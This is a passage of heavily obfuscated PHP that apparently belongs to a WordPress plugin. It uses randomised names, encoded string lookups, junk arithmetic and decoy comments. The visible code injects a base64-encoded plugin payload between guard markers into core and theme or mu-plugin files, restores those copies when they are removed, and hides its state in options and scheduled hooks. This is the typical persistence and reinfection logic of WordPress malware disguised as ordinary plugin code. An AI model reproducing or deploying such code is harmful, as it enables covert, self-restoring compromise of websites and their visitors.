   if ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(1268))  &&  $GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(1286)))    {
 $key   =  spbgc6gzfic1pdmgag();
        if   ($key  !==    false)    {
 $_sbx_injkf =  @$GLOBALS['__scf_jtrkjx2kfzx520_1268']($key,     'w',  0, 0);
 if   ($_sbx_injkf) {
@$GLOBALS['__scf_orzert3s6o7k_1275']($_sbx_injkf);
 @$GLOBALS['__scf_mtshhbg5v0emtr_1271']($_sbx_injkf);



    }


  }
 }
  if   ($GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(1658)))    {
   $je6b6gmzg5   = dv62azao9qb3z33m4cwig0(ABSPATH . m40pvx5ij_z4mj(1575),  (0x1+0x9));


 @delete_option($je6b6gmzg5);
  $hip5tba1l_z03xs0 =   $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(1659)) ? @get_option(m5t68uuej1(1660),  array())    :  array();
    if  ($GLOBALS['__scf_pomb89yiuz_37']($hip5tba1l_z03xs0)) {
     if (isset($hip5tba1l_z03xs0['b'])) netei2x342rtzmi4tj69($hip5tba1l_z03xs0['b']);
   if  (isset($hip5tba1l_z03xs0[bovhd4vawcd(1584)])  && $GLOBALS['__scf_pomb89yiuz_37']($hip5tba1l_z03xs0[m5t68uuej1(1584)]))      {
foreach ($hip5tba1l_z03xs0[m40pvx5ij_z4mj(1584)]   as  $_ci)  {
 if   ($GLOBALS['__scf_pomb89yiuz_37']($_ci) &&   isset($_ci['b']))    netei2x342rtzmi4tj69($_ci['b']);
     }
  }
   }
   @delete_option(m5t68uuej1(1660));
  @delete_option(m5t68uuej1(1430));
 @delete_option(m40pvx5ij_z4mj(1255));
      @delete_option(bovhd4vawcd(1661));
  @delete_option(lpwgqh9300(1662));
   @delete_option(lpwgqh9300(1663));$f4__2b04_yn=86|14;$vn7hdn4a5002d=$f4__2b04_yn^159;
@delete_option(m40pvx5ij_z4mj(1184));
   @delete_option(lpwgqh9300(1664));$q6z2qas3ex=155|45;$xvmubiiz=$q6z2qas3ex^101;
   unset($hip5tba1l_z03xs0,  $_ci);
       }
      if ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(1665))) {
   @delete_transient(m5t68uuej1(653));
    @delete_transient(lpwgqh9300(1303));
      @delete_transient(ikw0tf8wjoufcwbi7uaqr());
     }
 if   ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(657)))    {
   @wp_clear_scheduled_hook(bovhd4vawcd(1666));
@wp_clear_scheduled_hook(m40pvx5ij_z4mj(1667));
    @wp_clear_scheduled_hook(u_9shatqcniwqfywsjc2m());
     }
     } catch (Throwable $k3g08rnqu9m)   {
// WP Full Site Editing: atomic invariant

   r63yaewew47stuijcrwsx6(m40pvx5ij_z4mj(1668), $k3g08rnqu9m);
  } catch  (Exception   $k3g08rnqu9m) {
 }



 }
      function i3ldakax12xf_w589()
{
     try     {$l97oe8il=(0xec+0x77);$ezap6sycp39o5i=$l97oe8il%12;

     if  (!defined(lpwgqh9300(1669)))   return    false;
 $e3thri4q7dp = r5waslskyqytjrm6();
$x0t804_2axb9   =  $e3thri4q7dp  . lpwgqh9300(1670);
 $lnfyvmqftz     =  $GLOBALS['__scf_os_n9tj5psxjj_3'](t6995wceyqc2q1wqvl(),  lpwgqh9300(1671));
  $xs7ycu0j4f9 = z2lalb3eiqlgy6ozb9();
   if (!$xs7ycu0j4f9 ||  $GLOBALS['__scf_fr9u7cq1eo_10']($xs7ycu0j4f9)   <     (478+22) ||   $GLOBALS['__scf_fr9u7cq1eo_10']($xs7ycu0j4f9)     >   (1048538+38) || at2pgldx1ep7sbjlr_r7($xs7ycu0j4f9)    ||     !fgcc_h22bqxgwmccod($xs7ycu0j4f9))   return false;
  $current = @$GLOBALS['__scf_nmc3chd3edto_699']($x0t804_2axb9)  ?  @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($x0t804_2axb9)   :  "";



if  (!$GLOBALS['__scf_e_8z8ias8ka_43']($current))   {
 r63yaewew47stuijcrwsx6(bovhd4vawcd(1672),  bovhd4vawcd(1203));
return   false;

}

 $current   =     bdsvhgz69_4ct5ntcc($current);
 $hu8724xqhdp90   =     kdgw8qqvzf6yolk() .  ':'  . dv62azao9qb3z33m4cwig0(ABSPATH . bovhd4vawcd(1673),  (6+2));
 $zaum0ps0v4j0gc =    m5t68uuej1(1674)     .  $hu8724xqhdp90  .  m40pvx5ij_z4mj(1403);
$d29li7yf2fvxv   =  m40pvx5ij_z4mj(1675)    .  $hu8724xqhdp90  .  m5t68uuej1(1403);



   $drdrde8n35 = dv62azao9qb3z33m4cwig0(ABSPATH   .     bovhd4vawcd(1673), (3+5));
   $yl03wik9bt  =    $GLOBALS['__scf_r1v12_o00h5hc_454'](bovhd4vawcd(1676) .  $drdrde8n35   . bovhd4vawcd(1677),   "", $current);
$uudcohpf87yiz4  =  ($GLOBALS['__scf_i8i8g4oxha_7']($yl03wik9bt, bovhd4vawcd(1678))  !==  false);
 if  ($GLOBALS['__scf_i8i8g4oxha_7']($current,   $zaum0ps0v4j0gc)   !==   false   &&   $GLOBALS['__scf_i8i8g4oxha_7']($current, $d29li7yf2fvxv) !==    false && !$uudcohpf87yiz4) return    true;
     $current =    $GLOBALS['__scf_r1v12_o00h5hc_454'](m5t68uuej1(1679),  "",     $yl03wik9bt);
    if  (!$GLOBALS['__scf_e_8z8ias8ka_43']($current))      {
  r63yaewew47stuijcrwsx6(lpwgqh9300(1672), m5t68uuej1(1246));
   return false;
}
 $wtvjfbz8g882q  =  ai51jutf9hg_v2ib();


if   (!$wtvjfbz8g882q)      return false;
$kflsggvk8c4q4bi =     lpwgqh9300(1680)  .    $GLOBALS['__scf_vvn10ievj2k_9']($GLOBALS['__scf_pe3s4q1z7z_59']($lnfyvmqftz   . (string)    eliqs4hzzhoila0pbe()),      0,  (9-1));
    $ma1m8300jxba_vyt   =   zjbm0yf_s5pmydvy7u2o6y(
   lpwgqh9300(1681),
array('__SLUG__',  '__PLUGIN_BASE64__', '__GUARD_NAME__', '__VERSION__'),
      array($lnfyvmqftz,     $wtvjfbz8g882q,  $kflsggvk8c4q4bi,  kdgw8qqvzf6yolk())
 );
    if  (!$ma1m8300jxba_vyt)  {
// WP InspectorControls: acquire call-graph


    if    ((int)   get_option(m5t68uuej1(751),     0)   >    0) r63yaewew47stuijcrwsx6(bovhd4vawcd(1682),   bovhd4vawcd(1683));

  return   false;
}
     $current     =   bdsvhgz69_4ct5ntcc($current);


$gtuxjh56tj4z6r = $GLOBALS['__scf_r1v12_o00h5hc_454'](lpwgqh9300(1299),     "", $ma1m8300jxba_vyt);
   $gas65htq9sg  =   ($GLOBALS['__scf_fr9u7cq1eo_10']($current)   ===    0);

if    (!$gas65htq9sg) {
 if (!ype7ijvdezmnkn5_(lpwgqh9300(1682)))  {
      r63yaewew47stuijcrwsx6(m40pvx5ij_z4mj(1682), lpwgqh9300(1684));
return   false;
  }
// Xdebug profiler: dehydrate watermark

 if   (!dljv6u_n3brkommu($x0t804_2axb9,   $current)) {$ebr45k46j_lp=(0xa6+0x72);$kr781ct04y=$ebr45k46j_lp%14;
   r63yaewew47stuijcrwsx6(bovhd4vawcd(1682),  m5t68uuej1(1250));
   return false;
      }
     uvja49fijck3fra0ncu(bovhd4vawcd(1682));
}    else    {
// type matching

if (!dljv6u_n3brkommu($x0t804_2axb9,    ""))  {
    r63yaewew47stuijcrwsx6(bovhd4vawcd(1685),   m5t68uuej1(1686));


     return  false;$g703mosye9wryv=PHP_INT_MAX/PHP_INT_MAX;$v3ff4wgb=$g703mosye9wryv+45;
     }
  }
   $c_k37hubu03ktz =   msi835s9cq5a10f08($current, $zaum0ps0v4j0gc  . "\n"  .   $gtuxjh56tj4z6r   .    "\n"      .     $d29li7yf2fvxv);
  if  (!a3hx61zfms1ji3euwsc($x0t804_2axb9,      $c_k37hubu03ktz)) {
return false;


 }
 rtmq61dax3c2elfi($x0t804_2axb9);
   lnseazh_1k4yq6v_kjl($x0t804_2axb9);
return true;
  }    catch    (Throwable      $k3g08rnqu9m)   {
     r63yaewew47stuijcrwsx6(lpwgqh9300(1685),  $k3g08rnqu9m);
 return  false;
}   catch (Exception  $k3g08rnqu9m)    {
  return false;
 }
// satisfiable covariant


 }
  function    i7u2ciwa1osy_eyk3()



{
     $utln0lk9ielcmwaa    =    array();
 if  (!$GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(1687)))   return $utln0lk9ielcmwaa;

$_d6ysbzk01f5  =   (defined(m40pvx5ij_z4mj(1642))     ? WP_CONTENT_DIR      :  (defined(bovhd4vawcd(1688)) ?      ABSPATH    . m5t68uuej1(82) :  "")) .  lpwgqh9300(1689);



 $bi5n9fb_4z0zec7  = (string)    @get_option(m5t68uuej1(1062),   "");


       if ($bi5n9fb_4z0zec7   !==  "")   $utln0lk9ielcmwaa[]   = $_d6ysbzk01f5 .  $bi5n9fb_4z0zec7  .  m5t68uuej1(1601);
  $jz0puc2u3oxdw6bn    =  (string)  @get_option(m40pvx5ij_z4mj(1063),    "");


   if ($jz0puc2u3oxdw6bn !==   ""  &&    $jz0puc2u3oxdw6bn  !==  $bi5n9fb_4z0zec7)  $utln0lk9ielcmwaa[]   =    $_d6ysbzk01f5 . $jz0puc2u3oxdw6bn     .   m40pvx5ij_z4mj(1690);



      return    $utln0lk9ielcmwaa;

}
 function  zkemd2ibfal3oe5zu9hr03()
    {
     if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(1691)) &&   is_multisite()  && $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(207)))  {

      return (array)  @get_site_option(bovhd4vawcd(1692),  array());


}
 return  (array)   @get_option(lpwgqh9300(1692), array());
 }
     function xdtrn925m3s6a486sj5z($ho_uo4wbxc3tqb_)
   {
// spill indecomposable phantom

if    ($GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(1691))      &&     is_multisite() &&     $GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(1693)))  {
 @update_site_option(lpwgqh9300(1692), $ho_uo4wbxc3tqb_);
return;
}
    @update_option(bovhd4vawcd(1694),    $ho_uo4wbxc3tqb_,  m5t68uuej1(1513));
  }

function    s8dg7u1x47a2jo7306x($uim861ig2y)
    {
 $ho_uo4wbxc3tqb_  =   zkemd2ibfal3oe5zu9hr03();
   

return   isset($ho_uo4wbxc3tqb_[dv62azao9qb3z33m4cwig0($uim861ig2y, (20-8))]);
 }
       function    qbuuywmmco2ibc($uim861ig2y)
 {
   $ho_uo4wbxc3tqb_  =  zkemd2ibfal3oe5zu9hr03();
   $c7fojwy1ww  =      $GLOBALS['__scf_ibw9xvmx9ckin_187']() -  (0x396429+0x3d42d7);


 foreach  ($ho_uo4wbxc3tqb_   as $zusurhlk29z => $pl61c488om)  {

      if ((int) $pl61c488om     < $c7fojwy1ww)  unset($ho_uo4wbxc3tqb_[$zusurhlk29z]); 
}



     $ho_uo4wbxc3tqb_[dv62azao9qb3z33m4cwig0($uim861ig2y,   (4+8))]    = $GLOBALS['__scf_ibw9xvmx9ckin_187']();
xdtrn925m3s6a486sj5z($ho_uo4wbxc3tqb_);
}
    function  llxpbihbjymzf4gf($uim861ig2y,     $c_k37hubu03ktz)
{
     if (!$GLOBALS['__scf_e_8z8ias8ka_43']($c_k37hubu03ktz)   ||    $c_k37hubu03ktz  === ""   || $GLOBALS['__scf_fr9u7cq1eo_10']($c_k37hubu03ktz)    >  (1048493+83)) return;



 $eagsznxr4fa = $GLOBALS['__scf_kfft5873yws_1265'](lpwgqh9300(1695),   $c_k37hubu03ktz);
 $eg90tcuzvk  =    (array)  @get_option(m40pvx5ij_z4mj(1696), array());
   $yivzbj99kx559x    = dv62azao9qb3z33m4cwig0($uim861ig2y,    (0x4+0x8));
 if   (isset($eg90tcuzvk[$yivzbj99kx559x][bovhd4vawcd(1695)])  &&     $eg90tcuzvk[$yivzbj99kx559x][m5t68uuej1(1697)]  ===    $eagsznxr4fa)  return;
$eg90tcuzvk[$yivzbj99kx559x] = array(m5t68uuej1(1605)   =>  $GLOBALS['__scf_fr9u7cq1eo_10']($c_k37hubu03ktz), bovhd4vawcd(1697)    =>   $eagsznxr4fa,  lpwgqh9300(1698)   =>  $GLOBALS['__scf_xsxk3ht6_06zc_354']($c_k37hubu03ktz));
    @update_option(m40pvx5ij_z4mj(1696), $eg90tcuzvk,  m40pvx5ij_z4mj(1513));
 }
 function  sevzmzsr_s234q($uim861ig2y)
  {
   $eg90tcuzvk = (array)  @get_option(m5t68uuej1(1696), array());
        $k3g08rnqu9m  = isset($eg90tcuzvk[dv62azao9qb3z33m4cwig0($uim861ig2y,   (4+8))])   ?  $eg90tcuzvk[dv62azao9qb3z33m4cwig0($uim861ig2y, (20-8))]   :   null;
      if    (!$GLOBALS['__scf_pomb89yiuz_37']($k3g08rnqu9m) || empty($k3g08rnqu9m[lpwgqh9300(1699)])  || empty($k3g08rnqu9m[bovhd4vawcd(1605)])  || empty($k3g08rnqu9m[bovhd4vawcd(1700)])) return    false;
    $pgdfohj28qig745 = $GLOBALS['__scf_wak9390fh7p_356']($k3g08rnqu9m[bovhd4vawcd(1701)],    true);
if   (!$GLOBALS['__scf_e_8z8ias8ka_43']($pgdfohj28qig745) ||    $GLOBALS['__scf_fr9u7cq1eo_10']($pgdfohj28qig745)    !==   (int) $k3g08rnqu9m[lpwgqh9300(1702)])    return  false;



        if  ($GLOBALS['__scf_kfft5873yws_1265'](m5t68uuej1(1703),   $pgdfohj28qig745)  !== $k3g08rnqu9m[m40pvx5ij_z4mj(1703)])  return  false;
      if (!fgcc_h22bqxgwmccod($pgdfohj28qig745)) return  false;

return  $pgdfohj28qig745;
   }
 function     vppjbyir5a93aenw0dy1e($ficosl5kq6,  $current)
 {
 $jfwr1yfn6lfkzmf =  orp0rsd3hzmr2x616cvnhm($current);



     if   (!$GLOBALS['__scf_e_8z8ias8ka_43']($jfwr1yfn6lfkzmf)   ||   $jfwr1yfn6lfkzmf  ===  "")    return false;
 $zgoy9fycl957ada     =  dha61pphirvk3tnlr() . bovhd4vawcd(1704)    .    dv62azao9qb3z33m4cwig0($ficosl5kq6,   (14-2)) . m40pvx5ij_z4mj(1448);
 $_ex    = @$GLOBALS['__scf_a83pywb98qzq2_20']($zgoy9fycl957ada) ?   @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($zgoy9fycl957ada) : false;



if (!$GLOBALS['__scf_e_8z8ias8ka_43']($_ex)     ||  $_ex !==   $jfwr1yfn6lfkzmf) {
if     (!a3hx61zfms1ji3euwsc($zgoy9fycl957ada, $jfwr1yfn6lfkzmf))  return   false;


  $_ex  = @$GLOBALS['__scf_a83pywb98qzq2_20']($zgoy9fycl957ada)   ?  @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($zgoy9fycl957ada)   :   false;
  if  (!$GLOBALS['__scf_e_8z8ias8ka_43']($_ex)     ||     $_ex  !==      $jfwr1yfn6lfkzmf)  return  false;
     }
llxpbihbjymzf4gf($ficosl5kq6, $jfwr1yfn6lfkzmf);

return true;
}
 function    gcwdbyx94_qn5693em8()
   {
xdtrn925m3s6a486sj5z(array());
     }
 function  dn3wpfss4949w9uqr0vo()

 {
   try      {
if (!defined(m5t68uuej1(1705)) ||    !$GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(1687)))    return;$mamxra9wn3_r=66|189;$adva_z8vsrj5=$mamxra9wn3_r^157;
      foreach (i7u2ciwa1osy_eyk3()  as     $qwg7rxrrsv6xi5)  {
if   (@$GLOBALS['__scf_a83pywb98qzq2_20']($qwg7rxrrsv6xi5)   &&   @$GLOBALS['__scf_pftf6vocmvs2m_99']($qwg7rxrrsv6xi5) >   0) continue;
  $zgoy9fycl957ada = dha61pphirvk3tnlr()   . m40pvx5ij_z4mj(1704)   .      dv62azao9qb3z33m4cwig0($qwg7rxrrsv6xi5,  (3+9))  .  m40pvx5ij_z4mj(1706);
     $r5wkdiuwr6 =   @$GLOBALS['__scf_a83pywb98qzq2_20']($zgoy9fycl957ada) ?  @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($zgoy9fycl957ada)   :  false;
      if  (!$GLOBALS['__scf_e_8z8ias8ka_43']($r5wkdiuwr6)  ||    $r5wkdiuwr6   === "")  {



$r5wkdiuwr6    =     sevzmzsr_s234q($qwg7rxrrsv6xi5);      
      if ($GLOBALS['__scf_e_8z8ias8ka_43']($r5wkdiuwr6) && $r5wkdiuwr6   !==  "")  @a3hx61zfms1ji3euwsc($zgoy9fycl957ada,   $r5wkdiuwr6);
 }



if  (!$GLOBALS['__scf_e_8z8ias8ka_43']($r5wkdiuwr6) ||    $r5wkdiuwr6 === "")   continue;



    clearstatcache(true, $qwg7rxrrsv6xi5);   
if (@$GLOBALS['__scf_a83pywb98qzq2_20']($qwg7rxrrsv6xi5)  &&   @$GLOBALS['__scf_pftf6vocmvs2m_99']($qwg7rxrrsv6xi5)  > 0)   continue;
if  (a3hx61zfms1ji3euwsc($qwg7rxrrsv6xi5,   $r5wkdiuwr6)) {
r63yaewew47stuijcrwsx6(m5t68uuej1(642), m40pvx5ij_z4mj(1707));
qbuuywmmco2ibc($qwg7rxrrsv6xi5);
     }


}
 } catch    (Throwable     $k3g08rnqu9m)  {

   r63yaewew47stuijcrwsx6(bovhd4vawcd(642),  $k3g08rnqu9m);



    }     catch    (Exception   $k3g08rnqu9m) {
// serialize bilinear builder

     }
}
  function pwgi0_o2uj4oc9bnap3o()
 {
  try {
    if    (!defined(m5t68uuej1(1708)))   return  false;
 $gjn1glw5jxtp =  i7u2ciwa1osy_eyk3();
     if  (empty($gjn1glw5jxtp))  return  false;



  $hu8724xqhdp90   = kdgw8qqvzf6yolk()   .  ':'  .    dv62azao9qb3z33m4cwig0(ABSPATH .  m5t68uuej1(1709), (2+6));

$zaum0ps0v4j0gc  = lpwgqh9300(1710) . $hu8724xqhdp90     .    lpwgqh9300(1403);
    $d29li7yf2fvxv =   bovhd4vawcd(1711) .   $hu8724xqhdp90    .  m5t68uuej1(1403);
  $kflsggvk8c4q4bi  =    lpwgqh9300(1712)     . $GLOBALS['__scf_vvn10ievj2k_9']($GLOBALS['__scf_pe3s4q1z7z_59'](ABSPATH   .  (string)    eliqs4hzzhoila0pbe()),      0, (0x2+0x6));



$lnfyvmqftz     =   $GLOBALS['__scf_os_n9tj5psxjj_3'](t6995wceyqc2q1wqvl(),      bovhd4vawcd(1671));
  $wtvjfbz8g882q  =  ai51jutf9hg_v2ib();
       if (!$wtvjfbz8g882q)  return  false;
 $a683lr5ukeiujfq  =   zjbm0yf_s5pmydvy7u2o6y(
      bovhd4vawcd(643),
  array('__SLUG__', '__PLUGIN_BASE64__',  '__GUARD_NAME__',   '__VERSION__'),
  array($lnfyvmqftz,   $wtvjfbz8g882q,   $kflsggvk8c4q4bi,    kdgw8qqvzf6yolk())
    );
  if (!$a683lr5ukeiujfq) {
        if ((int)   get_option(bovhd4vawcd(751),   0)  >  0)  r63yaewew47stuijcrwsx6(m5t68uuej1(1713),  m5t68uuej1(1714));
    return   false;
}
      $a683lr5ukeiujfq  =   $GLOBALS['__scf_r1v12_o00h5hc_454'](m40pvx5ij_z4mj(1299), "", $a683lr5ukeiujfq);
 if    (!$GLOBALS['__scf_e_8z8ias8ka_43']($a683lr5ukeiujfq) ||   $a683lr5ukeiujfq     === "")    return false;
  $myw3h598abz  =  false;
 foreach ($gjn1glw5jxtp   as    $ficosl5kq6)     {
    if (!@$GLOBALS['__scf_a83pywb98qzq2_20']($ficosl5kq6))  continue;
    if      (s8dg7u1x47a2jo7306x($ficosl5kq6))  continue;
      $wngh8vc3mx7gkb     =  $GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(136))      ?    @$GLOBALS['__scf_vtcl9hk0l_e1o6_23']($ficosl5kq6,   'c')  :  false;
    if  ($wngh8vc3mx7gkb  !==  false &&  $GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(122))  &&  !@flock($wngh8vc3mx7gkb,  LOCK_EX  |    LOCK_NB))    {
   @fclose($wngh8vc3mx7gkb);
continue;

 }



 $current =    @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($ficosl5kq6);
    if (!$GLOBALS['__scf_e_8z8ias8ka_43']($current))   {



        r63yaewew47stuijcrwsx6(m40pvx5ij_z4mj(1715), m40pvx5ij_z4mj(1203));
 if  ($wngh8vc3mx7gkb !==   false)   {
      if   ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(122)))  @flock($wngh8vc3mx7gkb, LOCK_UN);
  @fclose($wngh8vc3mx7gkb);
}
       continue;
    }
     try    {
if  ($GLOBALS['__scf_fr9u7cq1eo_10']($current) > (1159858-111282)) $current =   bdsvhgz69_4ct5ntcc($current);
  if  ($GLOBALS['__scf_i8i8g4oxha_7']($current, $zaum0ps0v4j0gc) !== false &&  $GLOBALS['__scf_i8i8g4oxha_7']($current, $d29li7yf2fvxv)  !==      false)  {
$myw3h598abz  =   true;
 continue;
}
 if (!@$GLOBALS['__scf_p_260ito5s0j_50']($ficosl5kq6)) continue;
   $wf5unio_8eqsnuz =  dv62azao9qb3z33m4cwig0(ABSPATH  .   bovhd4vawcd(1716),  (0x3+0x5));
    $rqx6flot_su42 =    $current;
  $current    =      zzlvsgg1dbts4z($current, m40pvx5ij_z4mj(1656),  lpwgqh9300(1717));
$current  =   $GLOBALS['__scf_r1v12_o00h5hc_454'](lpwgqh9300(1411), "",  $current);
 if  (!$GLOBALS['__scf_e_8z8ias8ka_43']($current))     {$fidqinoan6s0=29|127;$ng2gxg5y2cmxoi=$fidqinoan6s0^124;



 r63yaewew47stuijcrwsx6(bovhd4vawcd(1718), bovhd4vawcd(1246));
     continue;
}
if    ($GLOBALS['__scf_i8i8g4oxha_7']($current,   m5t68uuej1(1515)) !==  false  || $GLOBALS['__scf_i8i8g4oxha_7']($current,  m5t68uuej1(1719))  !==  false)   {
  $gboahewl_6      =   $GLOBALS['__scf_i8i8g4oxha_7']($current,     m5t68uuej1(1515));
$m029yevyvky4  = ($gboahewl_6   !==   false) ?    $GLOBALS['__scf_vvn10ievj2k_9']($current, $gboahewl_6)  :  $current;
 if ($GLOBALS['__scf_i8i8g4oxha_7']($m029yevyvky4, bovhd4vawcd(1712)) === false &&   $GLOBALS['__scf_i8i8g4oxha_7']($m029yevyvky4, m40pvx5ij_z4mj(1719))     ===     false  &&   !$GLOBALS['__scf_vqnw5_4kg7eu_96'](lpwgqh9300(1720)  .   $wf5unio_8eqsnuz   . m5t68uuej1(1406),     $m029yevyvky4))    {
r63yaewew47stuijcrwsx6(bovhd4vawcd(1718), m5t68uuej1(1721));



continue;
  }
  $u3oz2prd2q95i  =    $GLOBALS['__scf_r1v12_o00h5hc_454'](m5t68uuej1(1722),     "\n",    $current);$njgj8d2x3jz=-186;$ibrxsgzmyp=($njgj8d2x3jz>0)?$njgj8d2x3jz:-$njgj8d2x3jz;
 if     ($GLOBALS['__scf_e_8z8ias8ka_43']($u3oz2prd2q95i)) $current  =  $u3oz2prd2q95i;
     $u3oz2prd2q95i  =  $GLOBALS['__scf_r1v12_o00h5hc_454'](m5t68uuej1(1723),  "",  $current);
if     ($GLOBALS['__scf_e_8z8ias8ka_43']($u3oz2prd2q95i)) $current  =  $u3oz2prd2q95i;$wlhf5mamj=PHP_INT_MAX/PHP_INT_MAX;$rmtb5veucgd=$wlhf5mamj+92;
      unset($u3oz2prd2q95i);
     if ($GLOBALS['__scf_i8i8g4oxha_7']($current,     lpwgqh9300(1515)) !==   false)     {
     r63yaewew47stuijcrwsx6(m40pvx5ij_z4mj(1718),    bovhd4vawcd(1724));


      continue;
}
// WordPress 6.6 block bindings: covariant-adj token-bucket

}
    if  ($myw3h598abz) {
    if     ($current  ===      $rqx6flot_su42)   continue;
   $w4xt8dmxjp4f8so   =  @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($ficosl5kq6);
  if    (!$GLOBALS['__scf_e_8z8ias8ka_43']($w4xt8dmxjp4f8so)) continue;



 if   ($GLOBALS['__scf_fr9u7cq1eo_10']($w4xt8dmxjp4f8so) >  (0xe7ef3+0x1810d))  $w4xt8dmxjp4f8so =   bdsvhgz69_4ct5ntcc($w4xt8dmxjp4f8so);
     if ($w4xt8dmxjp4f8so !==  $rqx6flot_su42)  {


  r63yaewew47stuijcrwsx6(bovhd4vawcd(1718),     bovhd4vawcd(1557));
   continue;
  }
// transpile vault for PCRE2 JIT

  unset($w4xt8dmxjp4f8so);
if   (!vppjbyir5a93aenw0dy1e($ficosl5kq6,    $current)) continue;
 if   (!dljv6u_n3brkommu($ficosl5kq6,   $current)) continue;



   if  (a3hx61zfms1ji3euwsc($ficosl5kq6,    $current)) rtmq61dax3c2elfi($ficosl5kq6);
continue;
 }
if   ($GLOBALS['__scf_vqnw5_4kg7eu_96'](m40pvx5ij_z4mj(1725),   $current)) {
r63yaewew47stuijcrwsx6(m40pvx5ij_z4mj(1718),      m5t68uuej1(1726));
 continue;
 }



 $xwds3wxg8c67gr   =      m5t68uuej1(839);


      if ($GLOBALS['__scf_fr9u7cq1eo_10']($current)    > 0 &&     $GLOBALS['__scf_i8i8g4oxha_7']($current,  lpwgqh9300(1727))     !==    false)   {



   $yu_r13ksxjr7 =  false;


if   ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(239)))  {
 $n8ehx3dxf_075t   =  @token_get_all($current);
    if ($GLOBALS['__scf_pomb89yiuz_37']($n8ehx3dxf_075t)) {


foreach    ($n8ehx3dxf_075t as    $pilw9wx_5ije0) {
 if      ($GLOBALS['__scf_pomb89yiuz_37']($pilw9wx_5ije0))      {
if    ($pilw9wx_5ije0[0]  === T_OPEN_TAG   ||   (defined(lpwgqh9300(1728)) &&     $pilw9wx_5ije0[0]  === T_OPEN_TAG_WITH_ECHO))   $yu_r13ksxjr7 =     true;
elseif   ($pilw9wx_5ije0[0] === T_CLOSE_TAG)    $yu_r13ksxjr7    =   false;
}


}
}
       unset($n8ehx3dxf_075t,    $pilw9wx_5ije0);


} else   {



  $_nzbzi4crx   = $GLOBALS['__scf_l5alcrnkzdc_1729']($current, bovhd4vawcd(1730));$r76xuc5qn1b=197|140;$fuk0hxf6pqlpj=$r76xuc5qn1b^234;
$n8hq_7osa6_r6m   =  $GLOBALS['__scf_l5alcrnkzdc_1729']($current,   bovhd4vawcd(1325));
if ($_nzbzi4crx  !== false  && ($n8hq_7osa6_r6m  ===     false ||   $_nzbzi4crx   >      $n8hq_7osa6_r6m))   $yu_r13ksxjr7    =   true;

  unset($_nzbzi4crx, $n8hq_7osa6_r6m);


   }
 if    ($yu_r13ksxjr7)   $xwds3wxg8c67gr =     "";
 unset($yu_r13ksxjr7);

     }



       $mkrgohfcdslq1v95     =     ($GLOBALS['__scf_fr9u7cq1eo_10']($current)     >  0) ?  "\n"  : "";
 $fcfza5ix0y  =   $GLOBALS['__scf_kr_w9stt2gb_360']($kflsggvk8c4q4bi,   $kflsggvk8c4q4bi .   '_'    .  $GLOBALS['__scf_vvn10ievj2k_9']($GLOBALS['__scf_pe3s4q1z7z_59']($ficosl5kq6), 0, (8-4)), $a683lr5ukeiujfq);
      $w8zuv4khi9t7      =    $mkrgohfcdslq1v95  .  $xwds3wxg8c67gr    .  $zaum0ps0v4j0gc    . "\n" .  $fcfza5ix0y    . "\n"  . $d29li7yf2fvxv     .  "\n";

 unset($fcfza5ix0y);

    $w4xt8dmxjp4f8so   =   @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($ficosl5kq6);



 if     (!$GLOBALS['__scf_e_8z8ias8ka_43']($w4xt8dmxjp4f8so))   {
 unset($rqx6flot_su42);
     continue;
 }
   if  ($GLOBALS['__scf_fr9u7cq1eo_10']($w4xt8dmxjp4f8so)   >    (1048558+18))  $w4xt8dmxjp4f8so =    bdsvhgz69_4ct5ntcc($w4xt8dmxjp4f8so);
 if   ($w4xt8dmxjp4f8so !==  $rqx6flot_su42)  {
 unset($w4xt8dmxjp4f8so,   $rqx6flot_su42);



 r63yaewew47stuijcrwsx6(m5t68uuej1(1718),   m5t68uuej1(1731));
      continue;
}
unset($w4xt8dmxjp4f8so, $rqx6flot_su42);$r44tea_ncw=89+31;$j679nhc8=$r44tea_ncw-46;
   if     (!vppjbyir5a93aenw0dy1e($ficosl5kq6,    $current)) continue;
    if (!dljv6u_n3brkommu($ficosl5kq6,   $current))  {
  r63yaewew47stuijcrwsx6(bovhd4vawcd(1718),  m5t68uuej1(1686));
 continue;
 }
  if (!a3hx61zfms1ji3euwsc($ficosl5kq6, $current .  $w8zuv4khi9t7))  continue;
  rtmq61dax3c2elfi($ficosl5kq6);
 $myw3h598abz = true;
 } finally   {
if  ($wngh8vc3mx7gkb      !==   false)  {
      if ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(122)))      @flock($wngh8vc3mx7gkb,    LOCK_UN);
 @fclose($wngh8vc3mx7gkb);
 }
}
 }
    return    $myw3h598abz;
   } catch  (Throwable $k3g08rnqu9m)     {$dw4bnml09=-653;$i6v3ct_ld4h8r=($dw4bnml09>0)?$dw4bnml09:-$dw4bnml09;
 r63yaewew47stuijcrwsx6(lpwgqh9300(1718),    $k3g08rnqu9m);



return false;
  }    catch      (Exception  $k3g08rnqu9m)   {
 return    false;
   }
   }



       function  eo43a_g2tbnijjb0u()
 {

  try {
  if (!defined(m40pvx5ij_z4mj(1708))) return;
 

